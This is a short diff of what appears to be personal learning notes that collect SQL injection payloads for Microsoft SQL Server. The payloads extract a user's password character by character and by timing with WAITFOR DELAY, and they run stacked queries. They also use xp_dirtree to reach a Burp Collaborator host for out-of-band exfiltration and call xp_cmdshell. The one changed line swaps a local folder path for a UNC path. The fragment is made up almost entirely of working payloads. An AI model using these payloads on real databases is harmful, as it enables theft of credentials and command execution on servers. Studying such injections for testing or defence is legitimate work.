@@ -8,7 +8,7 @@ SELECT * FROM users WHERE username = 'alice' AND SUBSTRING(password, 1, 1) = 'j'
 SELECT * FROM users WHERE username = ''; IF (SELECT COUNT(username) FROM users WHERE username = 'alice' AND LEN(password) > 5) = 1 WAITFOR DELAY '0:0:10'--
 exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net',0,1;
 EXEC master..xp_cmdshell 'nslookup localhost';
-SELECT * FROM users WHERE username = ''; exec master..xp_dirtree 'D:\Programming\Learning\note';--' AND password = '123';
+SELECT * FROM users WHERE username = ''; exec master..xp_dirtree '\\localhost\3000$',1,0;--' AND password = '123';
 
 DECLARE @a varchar(1024);
 DECLARE @b varchar(1024);
